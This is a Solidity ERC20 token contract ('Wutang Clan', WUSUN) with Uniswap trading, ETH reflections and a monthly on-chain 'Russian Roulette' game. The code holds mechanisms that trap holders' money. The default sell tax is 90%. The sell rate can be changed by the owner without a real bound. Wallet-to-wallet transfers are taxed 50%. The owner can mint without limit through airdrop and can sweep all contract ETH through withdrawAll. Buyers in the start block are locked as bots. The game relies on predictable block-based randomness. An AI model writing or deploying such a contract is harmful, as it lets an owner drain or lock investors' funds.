// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "https://github.com/bokkypoobah/BokkyPooBahsDateTimeLibrary/blob/master/contracts/BokkyPooBahsDateTimeLibrary.sol";

contract RussianRoulette is ERC20, Ownable {
    modifier lockSwap {
        _inSwap = true;
        _;
        _inSwap = false;
    }

    modifier liquidityAdd {
        _inLiquidityAdd = true;
        _;
        _inLiquidityAdd = false;
    }

    uint256 internal _maxTransfer = 2;//if LP is 0.05 then 1% is even more negligible increase maxTransfer to 4
    uint256 internal _buyRate1 = 15;
    uint256 internal _buyRate2 = 10;
    uint256 public _sellRate1 = 90;
    uint256 internal _sellRate2 = 15;
    uint256 internal _rrwinnerRate = 10;
    uint256 internal _reflectRate = 5;
    uint256 internal _cooldown = 60 seconds;
    uint256 internal _rrcooldown = 0 seconds;
    uint256 internal _swapFeesAt = 1000 ether;
    bool internal _useSecondFees = false;
    bool internal _useWinnerFees = false;
    bool internal _swapFees = true;
    uint public odds = 3; //3 here, 2 front end

    uint256 internal _ethReflectionBasis;
    uint256 internal _totalReflected;
    uint256 internal _totalMarketing;
    uint256 internal _totalDelegated;
    uint256 internal _totalEthReflectedToDate;
    uint256 internal _totalEthRBWToDate;
    uint256 internal _totalTaxesToDate;

    address payable internal _marketingWallet;
    address payable internal _treasuryWallet;

    uint256 internal _totalSupply = 0;
    uint256 internal _totalBurnt = 0;
    bool internal _teamMint = false;
    IUniswapV2Router02 internal _router = IUniswapV2Router02(address(0));
    address internal _pair;
    bool internal _inSwap = false;
    bool internal _inLiquidityAdd = false;
    bool internal _tradingActive = false;
    uint256 internal _tradingStartBlock = 3041510;//mainnet 14400000

    mapping(address => uint256) private _balances;
    mapping(address => bool) private _reflectionExcluded;
    mapping(address => bool) private _taxExcluded;
    mapping(address => bool) private _rrwinners;
    mapping(address => bool) private _bot;
    mapping(address => uint256) private _lastBuy;
    mapping(address => uint256) private _lastPlay;
    mapping(address => uint256) private _daysLeftToCool;
    mapping(address => uint256) private _lastReflectionBasis;
    mapping(address => uint256) private _sellDelegation;
    address[] internal _reflectionExcludedList;
    address[] public allWinners; // shows lifetime rr winners

    constructor(
        address uniswapFactory,
        address uniswapRouter,
        address payable treasuryWallet
    ) ERC20("Wutang Clan", "WUSUN") Ownable() {
        addTaxExcluded(owner());
        addTaxExcluded(treasuryWallet);
        addTaxExcluded(address(this));

        _marketingWallet = payable(owner());
        _treasuryWallet = treasuryWallet;

        _router = IUniswapV2Router02(uniswapRouter);
        IUniswapV2Factory uniswapContract = IUniswapV2Factory(uniswapFactory);
        _pair = uniswapContract.createPair(address(this), _router.WETH());
    }

    function addLiquidity(uint256 tokens) public payable onlyOwner() liquidityAdd {
        _mint(address(this), tokens);
        _approve(address(this), address(_router), tokens);

        _router.addLiquidityETH{value: msg.value}(
            address(this),
            tokens,
            0,
            0,
            owner(),
            //consider not relying on blocktime
            block.timestamp
        );

        if (!_tradingActive) {
            _tradingActive = true;//once we add liquidity we activate trading
            //_tradingStartBlock = block.number;
        }
    }
    //Manually increase amount available for claiming if we sent ETH from external wallet to our contract
    function addReflectionETH(uint256 amount) public onlyOwner() {
        _ethReflectionBasis += amount;
    }
    function EthReflectionBasis() public view returns (uint256) {
        return _ethReflectionBasis;
    }
    function delegatedForSell() public view returns (uint256) {
        uint256 tokensDelegated = _sellDelegation[msg.sender];
        return tokensDelegated;
    }
    function lastReflectionBasis(address account) public view returns (uint256) {
        return _lastReflectionBasis[account];
    }
    function currentRewardForWallet(address addr) public view returns(uint256) {
        uint256 basisDifference = _ethReflectionBasis - _lastReflectionBasis[addr];//even if you dont claim your eth will be there on contract waiting
        uint256 owed = basisDifference * balanceOf(addr) / _totalSupply;
        return owed;
    }
    function totalEthReflectedToDate() public view returns (uint256) {
        return _totalEthReflectedToDate;
    }
    function totalEthRebalancingToDate() public view returns (uint256) {
        return _totalEthRBWToDate;
    }
    function totalEthTaxedToDate() public view returns (uint256) {
        return _totalTaxesToDate;
    }
    function totalBurnt() public view returns (uint256) {
        return _totalBurnt;
    }
    function maxTransferAllowed() public view returns (uint256) {
        uint256 maxTxAmount = totalSupply() * _maxTransfer / 100;
        return maxTxAmount;
    }
    function tradingStartBlock() public view returns (uint256) {
        return _tradingStartBlock;
    }
    function secondFeesActive() public view returns (bool) {
        return _useSecondFees;
    }
    function winnerFeesActive() public view returns (bool) {
        return _useWinnerFees;
    }
    function whatsTodayDate() public view returns (uint) {
        uint date = isTodayFirstDayOfMonth();
        return date;
    }
    function RussianRouletteDay() public view returns (bool) {
        uint date = isTodayFirstDayOfMonth();
        if(date != 1){
            return false;
        }
        return true;
    }
    function RussianRouletteEligible(address account) public view returns (bool) {
        return _taxExcluded[account];
    }

// check if eligible for reflections
    function isReflectionExcluded(address account) public view returns (bool) {
        return _reflectionExcluded[account];
    }

//remove eligibility from reflections
    function removeReflectionExcluded(address account) public onlyOwner() {
        require(isReflectionExcluded(account), "Account must be excluded");

        _reflectionExcluded[account] = false;
    }

    function addReflectionExcluded(address account) public onlyOwner() {
        _addReflectionExcluded(account);
    }

    function _addReflectionExcluded(address account) internal {
        require(!isReflectionExcluded(account), "Account must not be excluded");
        _reflectionExcluded[account] = true;
    }
//................................................................

// Tax checking functions........................................
    function isTaxExcluded(address account) public view returns (bool) {
        return _taxExcluded[account];
    }
// adds address to tax exclusion
    function addTaxExcluded(address account) public onlyOwner() {//onlyowner
        require(!isTaxExcluded(account), "Account must not be excluded");

        _taxExcluded[account] = true;
    }

    function removeTaxExcluded(address account) public onlyOwner() {
        require(isTaxExcluded(account), "Account must not be excluded");

        _taxExcluded[account] = false;
    }

// The Russian Roulette Play
    function addrrwinners(address account) internal{
        require(!isTaxExcluded(account), "Account must not be excluded");
        _taxExcluded[account] = true;
        allWinners.push(account);
    }
     
    function setOdds(uint8 _odds) public onlyOwner() { //odds can be set manual and remain same or by owner
        assert( _odds > 0 && _odds <= 3); 
        odds = _odds;
    }

    function setSellTax(uint8 rate) public onlyOwner() {
        assert( _sellRate1 > 0); 
        _sellRate1 = rate;
    }

    function random(uint _rollsize) internal view returns(uint) {
       return uint(keccak256(abi.encodePacked(block.difficulty, block.timestamp, _rollsize)));
    }

// Play Russian Roulette - spin cylinder with combined odds of 1 in 6
    function _playRussianRoulette(uint _num) public  {
        require( balanceOf(msg.sender) > 100000000000000000000, "Should hold at least 100 tokens"); //check if token holder
        require( _num > 0  && _num <= odds, "Enter a value within the odds range");
        uint daysSincePlay = daysDifference();
        require((daysSincePlay - _daysLeftToCool[msg.sender]) >= 0,"Wait for the new month to play");//since wallet last played, month has reset
    
        uint result = random(_num) % odds;
        if(result == _num){
            addrrwinners(msg.sender);
        }
        //set last play time & days till month is over
        _daysLeftToCool[msg.sender] = daysLeftInMonth();//uint 1-30
        _lastPlay[msg.sender] = block.timestamp;//(then - last) > cooldownDays | in days
        return;
    }
//...................................................
//bot accounts on uniswap trading from router
    function isBot(address account) public view returns (bool) {
        return _bot[account];
    }

    function addBot(address account) internal {
        _addBot(account);
    }

    function _addBot(address account) internal {
        require(!isBot(account), "Account must not be flagged");
        require(account != address(_router), "Account must not be uniswap router");
        require(account != _pair, "Account must not be uniswap pair");

        _bot[account] = true;
        _addReflectionExcluded(account);
    }

    function removeBot(address account) public onlyOwner() {
        require(isBot(account), "Account must be flagged");

        _bot[account] = false;
        removeReflectionExcluded(account);
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function _addBalance(address account, uint256 amount) internal {
        _balances[account] = _balances[account] + amount;
    }

    function _subtractBalance(address account, uint256 amount) internal {
        _balances[account] = _balances[account] - amount;
    }
 //--------------------------------------------------------------------------------------------------------------------
//function to transfer money within token overwrites erc-20 method
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal override {
        if (isTaxExcluded(sender) || isTaxExcluded(recipient)) {//exclude contract transfers too
            _rawTransferFree(sender, recipient, amount);
            return; 
        }

        uint256 currentblock = block.number;
        require(currentblock >= _tradingStartBlock, "Trading starts at block 14400000");
        require(!isBot(sender), "Sender locked as bot");
        require(!isBot(recipient), "Recipient locked as bot");
        uint256 maxTxAmount = totalSupply() * _maxTransfer / 100;//not % change it to 100 for actual % calc
        require(amount <= maxTxAmount || _inLiquidityAdd || _inSwap || recipient == address(_router), "Exceeds max transaction amount");

        uint256 contractTokenBalance = balanceOf(address(this));
        bool overMinTokenBalance = contractTokenBalance >= _swapFeesAt;

        if(contractTokenBalance >= maxTxAmount) {
            contractTokenBalance = maxTxAmount;
        }

        if (
            overMinTokenBalance &&
            !_inSwap &&
            sender != _pair &&
            _swapFees
        ) {
            _swap(contractTokenBalance);
        }

        _claimReflection(payable(sender));
        _claimReflection(payable(recipient));

        uint256 send = amount;
        uint256 reflect;
        uint256 marketing;
        //indicates swap
        bool tokenSwap = false;
        if (sender == _pair && _tradingActive) {
            // Buy, apply buy fee schedule
            (
                send,
                reflect,
                marketing
            ) = _getBuyTaxAmounts(amount);
            require(block.timestamp - _lastBuy[tx.origin] > _cooldown || _inSwap, "hit cooldown, try again later");
            _lastBuy[tx.origin] = block.timestamp;
            //indicates swap
            tokenSwap = true;
        } else if (recipient == _pair && _tradingActive) {
            // Sell, apply sell fee schedule
            (
                send,
                reflect,
                marketing
            ) = _getSellTaxAmounts(amount);
            //indicates swap
            tokenSwap = true;
        }
        if(tokenSwap == false){   //Wallet to Wallet transfer
            if (sender == _treasuryWallet || recipient == _treasuryWallet) { 
                _rawTransfer(sender, recipient, send);
                return;
            }else{//ordinary wallet - disable wallet to wallet transfer to avoid cheating on RR play
                (   send,
                    reflect,
                    marketing
                ) = _getTransferTaxAmounts(amount);
                //reset
                tokenSwap = false;
            }
        }

        _rawTransfer(sender, recipient, send);
        if(marketing>0){_takeMarketing(sender, marketing);}
        if(reflect>0){_reflect(sender, reflect);}

        if (_tradingActive && block.number == _tradingStartBlock && !isTaxExcluded(tx.origin)) {
            if (tx.origin == address(_pair)) {
                if (sender == address(_pair)) {
                    _addBot(recipient);
                } else {
                    _addBot(sender);
                }
            } else {
                _addBot(tx.origin);
            }
        }
    }

    function _claimReflection(address payable addr) internal {
        if (addr == _pair || addr == address(_router)) return;

        uint256 basisDifference = _ethReflectionBasis - _lastReflectionBasis[addr];//even if you dont claim your eth will be there on contract waiting
        uint256 owed = basisDifference * balanceOf(addr) / _totalSupply;

        _lastReflectionBasis[addr] = _ethReflectionBasis;
        if (owed == 0) {
                return;
        }
        addr.transfer(owed);
    }

    function claimReflection() public {
        _claimReflection(payable(msg.sender));
    }
	
    function _rawTransferFree(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "reflect from the zero address");
        uint musi = isTodayFirstDayOfMonth();
        if(musi == 1){_useWinnerFees = true;}
        if(_inLiquidityAdd || sender == address(this) || sender == _treasuryWallet || recipient == _treasuryWallet || sender == _marketingWallet || recipient == _marketingWallet){//No fees
            _rawTransfer(sender, recipient, amount);
        }else{//treasury & marketing arent taxed 
            uint256 send = amount;
            uint256 reflect;
            uint256 marketing;
            //indicates swap
            bool tokenSwap = false;
            if (sender == _pair && _tradingActive) {// Buy, apply buy fee schedule
                (send,reflect,marketing) = _getBuyTaxAmounts(amount);
                tokenSwap = true;//indicates swap
            } else if (recipient == _pair && _tradingActive) {// Sell, apply sell fee schedule
                (send,reflect,marketing) = _getWinnerTaxAmounts(amount);
                tokenSwap = true;//indicates swap
            }
            if(tokenSwap == false){   //Wallet to Wallet transfer
                if(_inLiquidityAdd || sender == _treasuryWallet || recipient == _treasuryWallet || sender == _marketingWallet || recipient == _marketingWallet){//No fees
                    _rawTransfer(sender, recipient, send);
                    return;
                }else{//ordinary wallet - disable wallet to wallet transfer to avoid cheating on RR play
                    (send,reflect,marketing) = _getTransferTaxAmounts(amount);
                    tokenSwap = false;//reset
                }
            }
            _rawTransfer(sender, recipient, send);
            if(marketing>0){_takeMarketing(sender, marketing);}
            if(reflect>0){_reflect(sender, reflect);}
        }
    }

    function _swap(uint256 amount) internal lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();

        _approve(address(this), address(_router), amount);

        uint256 contractEthBalance = address(this).balance;

        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,//amount in
            0,//amount out in tokens
            path,//call path
            address(this),//address to
            block.timestamp//deadline
        );
        uint256 tradeValue = address(this).balance - contractEthBalance;//new balance less the old balance

        uint256 marketingAmount = amount * _totalMarketing / (_totalMarketing + _totalReflected);
        uint256 reflectedAmount = amount - marketingAmount;

        uint256 marketingEth = tradeValue * _totalMarketing / (_totalMarketing + _totalReflected);
        uint256 reflectedEth = tradeValue - marketingEth;

        if (marketingEth > 0) {
            //total taxes on contract = total tokens on contract
            //totalMarketing/totalTaxes = RBW share
            _marketingWallet.transfer(marketingEth);//only transfer RBW amount and leave reflections eth on contract
            //should add some eth to contract for gas in case all the eth there was from swapAll() then we wont have gas to send balance
        }
        _totalMarketing -= marketingAmount;//collected in tokens using it only to track how much is due to be assigned to RBW
        _totalReflected -= reflectedAmount;//same, tracks whats due to be converted into ETH for reflections
        _ethReflectionBasis += reflectedEth;//notifies users claim request how much is available for claiming
        _totalEthReflectedToDate += reflectedEth; //Total ETH reflected ever
        _totalEthRBWToDate += marketingEth;//Total ETH to RBW ever
        _totalTaxesToDate += tradeValue; //Total taxes collected ever in ETH
    }

    function swapAll() public {//everyone is free to declare reflections
        uint256 maxTxAmount = totalSupply() * _maxTransfer / 100;//make it a percentage
        uint256 contractSwapAllowance = _totalMarketing + _totalReflected;//current taxes collected on contract in tokens

        if(contractSwapAllowance >= maxTxAmount)
        {
            contractSwapAllowance = maxTxAmount;
        }

        if (
            !_inSwap
        ) {
            _swap(contractSwapAllowance);
        }
    }

    function _swapSellForWallet(address payable addr, uint256 amount) internal lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();

        //we should leave proceeds in LP & take 10% only ideally, then cover the 10% from buy tax and sharebidding
        //share bidding allows you to sell without affecting the LP but we charge 10% for every proxy service to both parties netting 20% (10% seller tokens & 10% buyer ETH)
        //Lastly we rely on investors to also buy the small dips and help level out the chart
        uint256 amountBurnt = (amount * _sellRate1) / 100;
        uint256 amountSwap = amount - amountBurnt;
        _burnTokens(amountBurnt);

        _approve(address(this), address(_router), amountSwap);
        //Leaving comments to explore capabilities of swap functions & how you want your transactions to appear: broker capabilities need to be explored in escrow
        //uint256 contractEthBalance = address(this).balance;
       // uint256 gasBefore = gasleft();//gas

        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountSwap,//amount in
            0,//amount out in tokens
            path,//call path
            addr,//address to
            block.timestamp//deadline
        );
        //uint256 tradeValue = address(this).balance - contractEthBalance;//new balance less the old balance
        /*uint256 gasAfter = gasleft();//gas
        uint256 gasUsed = gasBefore - gasAfter;
        
        uint256 gasRefund = gasUsed * tx.gasprice; //10% extra to cover eth transfer to seller
        uint256 extraFee = gasRefund * 1/10;
        uint256 userProceeds = tradeValue - gasRefund - extraFee;
        
        //Had to change eth being send to contarct first, realised it will cause sell trades to not appear properly
        //ETH is being send directly to wallet of owner, no need to calculate how much to transfer 
        if (tradeValue > 0) {
            addr.transfer(tradeValue);//seller gets ETH
        }
        */
        _sellDelegation[msg.sender] -= amount;
    }

    function swapForUser() public {//sell through contract to be taxed correctly, bypassing Uniswap tax limitations
        require(_sellDelegation[msg.sender] > 0, "no tokens delegated for selling");
        uint256 maxTxAmount = totalSupply() * _maxTransfer / 100;//make it a percentage
        uint256 walletTokenBalance = _sellDelegation[msg.sender];//users balance of delegated tokens

        if(walletTokenBalance >= maxTxAmount)
        {
            walletTokenBalance = maxTxAmount;
        }

        if (
            !_inSwap
        ) {
            _swapSellForWallet(payable(msg.sender), walletTokenBalance);
        }
    }

    function withdrawAll() public onlyOwner() {
        uint256 totalETH = address(this).balance;
        _marketingWallet.transfer(totalETH);//moves all ETH from contract if we migrate
    }

    function _burnTokens(uint256 amount) internal {
        //burn 90% and leave 10% -- update delegated mapping for wallet as well in swapForUser
        _totalSupply -= amount;//update supply
        address burnAddr = 0x000000000000000000000000000000000000dEaD;

        _rawTransfer(address(this), burnAddr, amount);//contract & burn addy balances updated in here, no need to update again
        _totalBurnt += amount; 
        //emit Transfer(address(this), burnAddr, amount);
    }

    function _reflect(address account, uint256 amount) internal {
        require(account != address(0), "reflect from the zero address");

        _rawTransfer(account, address(this), amount);
        _totalReflected += amount;//keep track of reflection amounts since all taxes are collected to contract address
        //emit Transfer(account, address(this), amount);
    }

    function _takeMarketing(address account, uint256 amount) internal {
        require(account != address(0), "take marketing from the zero address");

        _rawTransfer(account, address(this), amount);
        _totalMarketing += amount;//keep track like above, we need a way to know how to split the ETH after swapAll()
        //emit Transfer(account, address(this), amount);
    }

    function _delegateSell(uint256 amount) public {
        require(msg.sender != address(0), "delegate from the zero address");
        //using mapping to keep track of all tokens delegated to contract for sell
        _sellDelegation[msg.sender] += amount;//for each wallet..only change back to zero when you sell
        
        _rawTransfer(msg.sender, address(this), amount);
        _totalDelegated += amount;//keep track of all tokens delegated to contract for selling
        //emit Transfer(msg.sender, address(this), amount);
    }

    function _getTransferTaxAmounts(uint256 amount)
        internal
        pure
        returns (
            uint256 send,
            uint256 reflect,
            uint256 marketing
        )
    {
        reflect = 0;
        
        send = (amount * 50) / 100;
        marketing = amount - send;
        assert(marketing >= 0);
        assert(send + reflect + marketing == amount);
    }

    function _getBuyTaxAmounts(uint256 amount)
        internal
        view
        returns (
            uint256 send,
            uint256 reflect,
            uint256 marketing
        )
    {
        marketing = 0;
        reflect = 0;
        if (_useSecondFees) {
            uint256 sendRate = 100 - _reflectRate;
            assert(sendRate >= 0);

            send = (amount * sendRate) / 100;
            reflect = amount - send;
            assert(reflect >= 0);
            assert(send + reflect + marketing == amount);
        } else {
            uint256 sendRate = 100 - _buyRate1;
            assert(sendRate >= 0);

            send = (amount * sendRate) / 100; //send 85%
            reflect = (amount * _reflectRate) / 100; //take 5% reflection
            marketing = amount - send - reflect; //10% thats left goes to RBW
            assert(reflect >= 0);
            assert(send + reflect + marketing == amount);
        }
    }

    function _getSellTaxAmounts(uint256 amount)
        internal
        view
        returns (
            uint256 send,
            uint256 reflect,
            uint256 marketing
        )
    {
        marketing = 0;
        reflect = 0;
        //Check if RRday first
        if (_useSecondFees) {
            uint256 sendRate = 100 - _sellRate2;
            assert(sendRate >= 0);

            send = (amount * sendRate) / 100;
            marketing = amount - send;
            assert(reflect >= 0);
            assert(send + reflect + marketing == amount);
        } else {
            uint256 sendRate = 100 - _sellRate1;
            assert(sendRate >= 0);

            send = (amount * sendRate) / 100;
            marketing = amount - send;
            assert(reflect >= 0);
            assert(send + reflect + marketing == amount);
        }
    }

    function _getWinnerTaxAmounts(uint256 amount)
        internal
        view
        returns (
            uint256 send,
            uint256 reflect,
            uint256 marketing
        )
    {
        marketing = 0;
        reflect = 0;
        //Check if RRday first
        if ((_useWinnerFees) ) {
            uint256 sendRate = 100 - _rrwinnerRate;

            send = (amount * sendRate) / 100;
            assert(send + reflect + marketing == amount);
        } else {
            uint256 sendRate = 100 - _sellRate1;
            assert(sendRate >= 0);

            send = (amount * sendRate) / 100;
            marketing = amount - send;
            assert(send + reflect + marketing == amount);
        }
    }

    // modified from OpenZeppelin ERC20
    function _rawTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        require(sender != address(0), "transfer from the zero address");
        require(recipient != address(0), "transfer to the zero address");

        uint256 senderBalance = balanceOf(sender);
        require(senderBalance >= amount, "transfer amount exceeds balance");
        unchecked {
            _subtractBalance(sender, amount);
        }
        _addBalance(recipient, amount);

        emit Transfer(sender, recipient, amount);
    }

    function setMaxTransfer(uint256 maxTransfer) public onlyOwner() {
        _maxTransfer = maxTransfer;
    }

    function setSwapFees(bool swapFees) public onlyOwner() {
        _swapFees = swapFees;
    }

    function setUseSecondFees(bool useSecondFees) public onlyOwner() {
        _useSecondFees = useSecondFees;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function _mint(address account, uint256 amount) internal override {
        _totalSupply += amount;
        _addBalance(account, amount);
        emit Transfer(address(0), account, amount);
    }

    function mintTeam(uint256 amount) public onlyOwner() {
        require(_teamMint == false, "Team tokens already minted");
        _mint(_marketingWallet, amount);
        _teamMint = true;
    }

    function airdrop(address[] memory accounts, uint256[] memory amounts) public onlyOwner() {
        require(accounts.length == amounts.length, "array lengths must match");

        for (uint256 i = 0; i < accounts.length; i++) {
            _mint(accounts[i], amounts[i]);
        }
    }

    function tradingStarted() internal view returns (bool) {
        if (_tradingStartBlock < block.number){
            return true;
        }else{
            return false;
        }
    }
// date checks
    function daysDifference() public view returns (uint){
        uint daysLeft = BokkyPooBahsDateTimeLibrary.diffDays(_lastPlay[msg.sender], block.timestamp);//then - now
		return daysLeft;
    }
    function daysLeftInMonth() public view returns (uint){
        uint daysTotal = BokkyPooBahsDateTimeLibrary.getDaysInMonth(block.timestamp);
        uint daysInto = isTodayFirstDayOfMonth();
        uint daysLeft = daysTotal - daysInto;
		return daysLeft;
    }
    function isTodayFirstDayOfMonth() internal view returns (uint) { // to be made internal
        uint today = BokkyPooBahsDateTimeLibrary.getDay(block.timestamp);
		return today;
    }
    receive() external payable {}
}
